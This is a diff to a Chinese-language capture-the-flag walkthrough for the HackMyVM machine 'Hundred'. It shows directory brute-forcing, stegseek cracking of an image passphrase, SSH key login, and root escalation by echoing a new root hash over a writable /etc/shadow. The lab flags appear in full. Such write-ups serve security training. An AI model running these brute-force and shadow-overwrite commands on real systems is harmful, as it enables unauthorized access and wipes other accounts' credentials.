@@ -1,6 +1,6 @@
 # Hundred
 
-2024-11-22 https://hackmyvm.eu/machines/machine.php?vm=Hundred
+2024-12-28 https://hackmyvm.eu/machines/machine.php?vm=Hundred
 
 ## IP
 
@@ -30,7 +30,7 @@ file h4ckb1tu5.enc
 h4ckb1tu5.enc: data
 ```
 
-enc 文件是加密后的文件，可以是用 openssl 进行解密，
+enc 文件是加密后的文件。同时用 gobuster 进行扫描，没发现其他有用目录。
 
 ftp 允许匿名登陆，先看 ftp，里面有如下文件：
 
@@ -63,6 +63,69 @@ cromiphi
 softyhack
 b4el7d
 val1d
+
+Thanks
+hmv
 ```
 
-id_rsa.pem 中发现了私钥，使用此私钥对上面的用户字典尝试 ssh 密钥登陆，
+id_rsa.pem 中发现了私钥，使用此私钥对上面的用户字典尝试 ssh 密钥登陆，但是都不成功。最后的那个 hmv 像是用户名。
+
+尝试用得到的私钥去解密 h4ckb1tu5.enc 文件，得到了另外一个目录提示：
+
+```
+openssl rsautl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc > result.txt
+
+cat result.txt
+/softyhackb4el7dshelldredd
+```
+
+访问这个目录/softyhackb4el7dshelldredd，但是什么都没发现，可能这个 softyhackb4el7dshelldredd 是一个密码，尝试用上面得到的 users.txt 进行爆破，也没有成功。
+
+使用 gobuster 大字典对这个目录/softyhackb4el7dshelldredd 再次进行爆破，发现 id_rsa:
+
+```
+http://192.168.5.39/softyhackb4el7dshelldredd/id_rsa
+```
+
+下载的 id_rsa 有密钥，使用 john 对其进行解密，rockyou 没有得到密码。
+
+经过查询发现首页那张图片存在隐写，使用 stegseek 和 users.txt 对其进行解密：
+
+```
+stegseek --crack logo.jpg users.txt
+
+cat logo.jpg.out
+d4t4s3c#1
+```
+
+得到 id_rsa 的密码: `d4t4s3c#1`
+
+进行登陆：ssh -i id_rsa hmv@192.168.5.39
+
+得到了 user flag：
+
+```
+hmv@hundred:~$ cat user.txt
+HMV100vmyay
+```
+
+进行系统枚举，发现 /etc/shadow 文件可写，对其 root 用户的密码进行覆盖：
+
+```
+mkpasswd -m sha-512 rootroot
+$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1
+
+root:$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1:19729:0:99999:7:::
+
+echo 'root:$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1:19729:0:99999:7:::' > /etc/shadow
+```
+
+写入后，用 rootroot 密码切换到 root 用户，得到了最终的 flag：
+
+```
+root@hundred:/home# cd /root
+root@hundred:~# ls
+root.txt
+root@hundred:~# cat root.txt
+HMVkeephacking
+```
